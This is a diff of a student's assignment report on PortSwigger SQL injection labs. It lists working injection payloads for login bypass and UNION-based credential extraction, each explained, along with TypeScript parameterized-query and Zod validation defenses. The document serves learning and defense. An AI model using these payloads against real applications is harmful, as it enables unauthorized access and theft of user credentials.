@@ -3,215 +3,193 @@
 
 ## Introduction
 
-In this assignment, I learned how SQL injection works and how to prevent it.
+In this assignment, I practiced SQL injection using PortSwigger Web Security Academy and learned how to prevent it using TypeScript, parameterized queries, and Zod.
 
-I completed five practical labs using PortSwigger Web Security Academy. I also created two TypeScript files to demonstrate the difference between vulnerable SQL queries and safe parameterized queries.
+## Lab 1 – Retrieve Hidden Data
 
-## 1. What is SQL Injection?
+Status: Not documented as completed.
 
-SQL injection is a security vulnerability that occurs when an application includes user input directly in an SQL query.
+Example payload:
+' OR 1=1--
 
-An attacker may be able to change how the database interprets the query.
+Expected SQL query:
+SELECT * FROM products
+WHERE category = '' OR 1=1--'
+AND released = 1
 
-Possible consequences include:
+Why it works:
+OR 1=1 makes the condition true, and the comment removes the released-product restriction.
 
-- Accessing information without permission
-- Bypassing authentication
-- Reading sensitive database information
-- Changing the intended behavior of SQL queries
+## Lab 2 – Login Bypass
 
-SQL injection can be prevented by using parameterized queries.
+Status: Solved.
 
-## 2. PortSwigger Labs
+Payload:
+administrator'--
 
-### Lab 1 – SQL Injection Login Bypass
+Expected SQL query:
+SELECT * FROM users
+WHERE username = 'administrator'--'
+AND password = 'password'
 
-**Status:** Solved
+Why it works:
+The comment removes the password condition, allowing the administrator account to be selected without checking the password.
 
-**Objective:**
-Understand how SQL injection can bypass a login system.
+## Lab 3 – UNION: Retrieve Data from Other Tables
 
-**What I did:**
-I tested the login functionality in the PortSwigger practice environment.
+Status: Solved.
 
-I used SQL injection to change the login query and successfully accessed the administrator account.
-
-**What I learned:**
-SQL injection can allow authentication bypass when user input is handled incorrectly.
-
-### Lab 2 – UNION Attack: Retrieving Data from Other Tables
-
-**Status:** Solved
-
-**Objective:**
-Understand how UNION SELECT can retrieve information from another database table.
-
-**What I did:**
-I tested the product category filter and used UNION SELECT to retrieve data from the users table.
-
-Example:
-
-```sql
+Payload:
 ' UNION SELECT username,password FROM users--
-```
 
-I then used the administrator credentials in the lab to complete the exercise.
+Expected SQL query:
+SELECT name, description FROM products
+WHERE category = ''
+UNION SELECT username,password FROM users--'
 
-**What I learned:**
-A vulnerable SQL query may allow data from other tables to appear in application results.
+Why it works:
+UNION combines the original results with values from the users table when the number and types of columns match.
 
-### Lab 3 – UNION Attack: Determining the Number of Columns
+## Lab 4 – Determine the Number of Columns
 
-**Status:** Solved
+Status: Solved.
 
-**Objective:**
-Find out how many columns are returned by the original SQL query.
-
-**What I did:**
-I tested ORDER BY with different column numbers.
-
-Example:
-
-```sql
+Payloads:
 ' ORDER BY 3--
-```
-
-The query worked with three columns, but using four produced an internal server error.
-
-I then tested:
-
-```sql
+' ORDER BY 4--
 ' UNION SELECT NULL,NULL,NULL--
-```
 
-The lab was completed successfully.
+Expected SQL query:
+SELECT * FROM products
+WHERE category = ''
+ORDER BY 3--'
 
-**What I learned:**
-ORDER BY and UNION SELECT can be used to determine the number of columns in a vulnerable query.
+Why it works:
+ORDER BY 3 worked, but ORDER BY 4 produced an error. This indicated that the query returned three columns.
 
-### Lab 4 – UNION Attack: Finding a Column Containing Text
+## Lab 5 – Find a Column Containing Text
 
-**Status:** Solved
+Status: Solved.
 
-**Objective:**
-Identify which column can contain text.
-
-**What I did:**
-I tested a UNION SELECT query with a text value in the second column.
-
-Example:
-
-```sql
+Payload:
 ' UNION SELECT NULL,'x0tfxh',NULL--
-```
 
-The application accepted the query and the lab was solved.
+Expected SQL query:
+SELECT * FROM products
+WHERE category = ''
+UNION SELECT NULL,'x0tfxh',NULL--'
 
-**What I learned:**
-UNION SELECT requires compatible data types, and testing text values can help identify suitable columns.
+Why it works:
+The second column accepted a text value. UNION requires compatible data types between the two queries.
 
-### Lab 5 – UNION Attack: Retrieving Multiple Values in One Column
+## Lab 6 – Retrieve Multiple Values in One Column
 
-**Status:** Solved
+Status: Solved.
 
-**Objective:**
-Retrieve multiple database values using a single text column.
-
-**What I did:**
-I tested the category filter and confirmed that the query returned two columns.
-
-I then combined the username and password into one text value.
-
-Example:
-
-```sql
+Payload:
 ' UNION SELECT NULL,username||':'||password FROM users--
-```
 
-The results displayed the username and password together.
+Expected SQL query:
+SELECT name, description FROM products
+WHERE category = ''
+UNION SELECT NULL,username||':'||password
+FROM users--'
 
-I used the administrator credentials to complete the lab.
+Why it works:
+String concatenation combines the username and password into a single text value, separated by a colon.
 
-**What I learned:**
-String concatenation can combine multiple database values into a single column.
+## Lab 7 – Examine the Database
 
-## 3. TypeScript – Vulnerable SQL Query
+Optional. Not completed.
 
-**File:** vulnerable.ts
+## Lab 8 – Blind SQL Injection
 
-I created a function called getProducts() that builds an SQL query using string concatenation.
+Optional. Not completed.
 
-Normal input:
+## Challenge 9 – Prevent SQL Injection
 
-```text
-Gifts
-```
+### Vulnerable Example
 
-Unsafe input:
+File: vulnerable.ts
 
-```text
+The vulnerable example builds an SQL query using string concatenation.
+
+Example input:
 Gifts' OR 1=1--
-```
 
-The unsafe input changes the structure of the generated SQL query.
+Generated SQL:
+SELECT name, description FROM products
+WHERE category = 'Gifts' OR 1=1--'
+AND released = 1
 
-This demonstrates why inserting user input directly into SQL is dangerous.
+The injected OR condition changes the query, and the comment removes the released-product restriction.
 
-The example prints the SQL query without connecting to a real database.
+### Secure Example
 
-## 4. TypeScript – Secure SQL Query
+File: secure.ts
 
-**File:** secure.ts
+The secure example uses a parameterized query:
 
-I created a second version using a parameterized SQL query.
+SELECT name, description FROM products
+WHERE category = $1 AND released = 1
 
-The query uses a placeholder:
+The category value is stored separately in a values array.
 
-```sql
-SELECT * FROM products WHERE category = $1
-```
+I also used Zod to validate the input.
 
-The input is stored separately:
+Allowed categories:
+- Gifts
+- Food
+- Clothing
 
-```typescript
-values: [category]
-```
+The malicious input is rejected because it is not an allowed category.
 
-This allows the database driver to handle user input as data instead of SQL instructions.
+### Why Parameterized Queries Work
 
-The TypeScript example demonstrates the structure of a safe query. It does not execute the query against a database.
+A parameterized query separates SQL instructions from user input.
 
-## 5. Vulnerable vs Secure Queries
+The database driver treats the parameter as a value rather than part of the SQL command.
 
-| Vulnerable Query | Secure Query |
-|---|---|
-| Uses string concatenation | Uses parameters |
-| Includes input directly in SQL | Keeps input separate |
-| Can change query behavior | Treats input as data |
-| Vulnerable to SQL injection | Protects against SQL injection when executed correctly |
+String concatenation is unsafe because it can allow input to change the SQL syntax.
 
-## 6. Conclusion
+### Why ORDER BY Needs a Whitelist
 
-In this assignment, I completed five SQL injection labs and learned how different vulnerabilities can affect database queries.
+SQL parameters such as $1 represent data values, not SQL identifiers or keywords.
 
-I practiced login bypass, UNION SELECT, column counting, finding text columns, and combining values.
+Column names and ORDER BY expressions cannot be safely substituted using a normal value parameter.
 
-I also created two TypeScript examples showing the difference between vulnerable and secure SQL queries.
+Instead, the application should check requested column names and sort directions against a fixed list of allowed values.
 
-The most important lesson is that user input should never be inserted directly into SQL queries.
+For example, only allow sorting by name or category and only allow ASC or DESC.
 
-Parameterized queries are an important method for protecting applications against SQL injection.
+## Testing
 
-## 7. Sources
+I tested the TypeScript examples using tsx.
 
-1. PortSwigger Web Security Academy – SQL Injection
-   https://portswigger.net/web-security/sql-injection
+The vulnerable example demonstrates how SQL injection changes a generated query.
 
-2. PortSwigger Web Security Academy – UNION Attacks
-   https://portswigger.net/web-security/sql-injection/union-attacks
+The secure example validates the category using Zod and rejects the malicious input.
 
-3. OWASP – SQL Injection Prevention Cheat Sheet
-   https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+These examples do not connect to or query a real database.
 
-4. PostgreSQL Documentation
-   https://www.postgresql.org/docs/current/sql.html
+## Conclusion
+
+This assignment helped me understand how SQL injection works and how it can expose information or bypass application restrictions.
+
+I practiced UNION attacks, column counting, text-column identification, and combining database values.
+
+I also learned that parameterized queries and input validation are important techniques for protecting backend applications.
+
+## Sources
+
+PortSwigger Web Security Academy:
+https://portswigger.net/web-security/sql-injection
+
+PortSwigger UNION Attacks:
+https://portswigger.net/web-security/sql-injection/union-attacks
+
+OWASP SQL Injection Prevention:
+https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+
+Zod:
+https://zod.dev/
